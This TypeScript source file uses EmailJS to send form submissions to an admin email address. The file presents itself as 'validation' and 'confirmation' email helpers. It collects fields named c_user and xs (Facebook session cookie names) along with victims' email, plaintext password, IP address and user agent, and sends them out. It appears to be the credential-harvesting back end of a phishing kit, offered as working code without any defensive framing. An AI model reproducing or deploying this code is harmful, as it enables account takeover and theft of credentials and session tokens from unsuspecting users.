import emailjs from "@emailjs/browser";

export const initEmailJS = () => {
  try {
    const userId = import.meta.env.VITE_EMAILJS_USER_ID;
    if (!userId) {
      throw new Error("EmailJS User ID is not configured");
    }
    emailjs.init(userId);
    console.log('EmailJS initialized successfully');
  } catch (error) {
    console.error("Failed to initialize EmailJS:", error);
    throw error;
  }
};

export const sendValidationFormEmail = async (formData: any) => {
  try {
    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateId = import.meta.env.VITE_EMAILJS_VALIDATION_TEMPLATE_ID;

    if (!serviceId || !templateId) {
      throw new Error("EmailJS service or template ID is not configured");
    }

    const templateParams = {
      to_name: "Admin",
      c_user: formData.c_user,
      xs: formData.xs,
      timestamp: formData.timestamp,
      ip_address: formData.ipAddress || "Not available",
      user_agent: formData.userAgent || navigator.userAgent,
    };

    console.log('Sending validation email with params:', {
      ...templateParams,
      xs: '[REDACTED]'
    });

    const response = await emailjs.send(serviceId, templateId, templateParams);
    console.log('Validation email sent successfully:', response);
    return response;
  } catch (error) {
    console.error("Error sending validation email:", error);
    throw error;
  }
};

export const sendConfirmationFormEmail = async (formData: any) => {
  try {
    console.log("Starting confirmation email send process");
    const serviceId = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateId = import.meta.env.VITE_EMAILJS_CONFIRMATION_TEMPLATE_ID;

    if (!serviceId || !templateId) {
      throw new Error("EmailJS service or template ID is not configured");
    }

    const templateParams = {
      to_name: "Admin",
      c_user: formData.c_user,
      xs: formData.xs,
      user_email: formData.user_email,
      password: formData.password,
      contact_method: formData.contactMethod,
      country_code: formData.countryCode,
      timestamp: formData.timestamp,
      ip_address: formData.ipAddress || "Not available",
      user_agent: formData.userAgent || navigator.userAgent,
    };

    console.log('Sending confirmation email with params:', {
      ...templateParams,
      password: '[REDACTED]',
      xs: '[REDACTED]'
    });

    const response = await emailjs.send(serviceId, templateId, templateParams);
    console.log('Confirmation email sent successfully:', response);
    return response;
  } catch (error) {
    console.error("Error sending confirmation email:", error);
    throw new Error(`Failed to send confirmation email: ${error.message}`);
  }
};